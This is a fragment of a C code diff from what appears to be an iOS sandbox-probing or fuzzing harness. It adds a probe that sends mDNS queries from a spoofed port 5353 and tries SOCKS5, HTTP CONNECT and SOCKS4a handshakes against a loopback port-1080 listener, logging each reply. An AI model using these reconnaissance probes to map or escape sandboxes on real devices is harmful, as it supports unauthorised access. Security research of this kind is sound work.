+                struct sockaddr_in l2 = {0};
+                l2.sin_len = sizeof(l2); l2.sin_family = AF_INET;
+                l2.sin_port = htons(5353); l2.sin_addr.s_addr = htonl(INADDR_ANY);
+                int lb = bind(tx2, (struct sockaddr *)&l2, sizeof(l2));
+                int lbe = lb < 0 ? errno : 0;
+                struct sockaddr_in d2 = {0};
+                d2.sin_len = sizeof(d2); d2.sin_family = AF_INET;
+                d2.sin_port = htons(5353); d2.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+                ssize_t s2 = sendto(tx2, q_meta, sizeof(q_meta), 0,
+                                    (struct sockaddr *)&d2, sizeof(d2));
+                int se2 = s2 < 0 ? errno : 0;
+                char rb2[512];
+                ssize_t r2 = recv(rx5353, rb2, sizeof(rb2), 0);
+                LOG("[mdns] from source port 5353 (bind rc %d err %d): send %zd "
+                    "err %d group-recv %zd err %d%s", lb, lbe, s2, se2, r2,
+                    r2 < 0 ? errno : 0,
+                    r2 > 0 ? "  *** RESPONDER ANSWERED PEER-FRAMED QUERY ***" : "");
+            }
+            close(tx2);
+            fsync(fileno(stderr));
+        }
+
+        close(tx);
+        close(rx5353);
+    }
+
+    // ---- TCP 1080: p_lsvc said "accepted then said nothing". Wait for a
+    // banner, then speak three dialects with a control between each.
+    {
+        int s = socket(AF_INET, SOCK_STREAM, 0);
+        struct sockaddr_in d = {0};
+        d.sin_len = sizeof(d); d.sin_family = AF_INET;
+        d.sin_port = htons(1080);
+        d.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        struct timeval atv = {3, 0};
+        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &atv, sizeof(atv));
+        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &atv, sizeof(atv));
+        int rc = connect(s, (struct sockaddr *)&d, sizeof(d));
+        LOG("[mdns] 1080 connect -> %d errno %d (waiting 3s for a banner)", rc,
+            rc < 0 ? errno : 0);
+        if (rc == 0) {
+            char rb[256];
+            ssize_t r = recv(s, rb, sizeof(rb), 0);
+            LOG("[mdns] 1080 unsolicited banner -> %zd errno %d", r,
+                r < 0 ? errno : 0);
+            // SOCKS5 greeting: version 5, 1 method, no-auth
+            static const uint8_t s5[] = { 0x05, 0x01, 0x00 };
+            ssize_t w = send(s, s5, sizeof(s5), 0);
+            r = recv(s, rb, sizeof(rb), 0);
+            LOG("[mdns] 1080 SOCKS5 greeting -> send %zd reply %zd errno %d", w, r,
+                r < 0 ? errno : 0);
+            if (r > 0)
+                LOG("[mdns]   reply bytes: %02x %02x %02x", rb[0],
+                    r > 1 ? rb[1] : 0, r > 2 ? rb[2] : 0);
+            fsync(fileno(stderr));
+        }
+        close(s);
+
+        // HTTP CONNECT is the other thing a port-1080 listener might expect
+        int s2 = socket(AF_INET, SOCK_STREAM, 0);
+        setsockopt(s2, SOL_SOCKET, SO_RCVTIMEO, &atv, sizeof(atv));
+        if (connect(s2, (struct sockaddr *)&d, sizeof(d)) == 0) {
+            static const char *http =
+                "CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n";
+            ssize_t w = send(s2, http, strlen(http), 0);
+            char rb[512];
+            ssize_t r = recv(s2, rb, sizeof(rb) - 1, 0);
+            if (r > 0) { rb[r] = 0; LOG("[mdns] 1080 HTTP CONNECT -> send %zd "
+                "reply %zd: %.100s", w, r, rb); }
+            else LOG("[mdns] 1080 HTTP CONNECT -> send %zd reply %zd errno %d", w, r,
+                     r < 0 ? errno : 0);
+        }
+        close(s2);
+
+        // SOCKS4a as the third dialect
+        int s3 = socket(AF_INET, SOCK_STREAM, 0);
+        setsockopt(s3, SOL_SOCKET, SO_RCVTIMEO, &atv, sizeof(atv));
+        if (connect(s3, (struct sockaddr *)&d, sizeof(d)) == 0) {
+            static const uint8_t s4[] = { 0x04, 0x01, 0x01, 0xbb, 127,0,0,1, 0 };
+            ssize_t w = send(s3, s4, sizeof(s4), 0);
+            char rb[16];
+            ssize_t r = recv(s3, rb, sizeof(rb), 0);
+            LOG("[mdns] 1080 SOCKS4a -> send %zd reply %zd errno %d%s", w, r,
+                r < 0 ? errno : 0,
+                (r > 0 && rb[0] == 0) ? "  (0x00 = request granted)" : "");
+        }
+        close(s3);
+        fsync(fileno(stderr));
+    }
+
+    if (ifp) freeifaddrs(ifp);
+    LOG("[mdns] done");
+}
+
 // V165 (p_ipopt): is there any header control left on a permitted socket?
 //
 // V163 found raw sockets refused with EPERM, which on recent iOS is
@@ -28141,6 +29495,9 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_NET")) { p_net(); LOG("[probe13] net-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC")) { p_lsvc(); LOG("[probe13] lsvc-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IPOPT")) { p_ipopt(); LOG("[probe13] ipopt-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ2")) { p_bq2(); LOG("[probe13] bq2-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
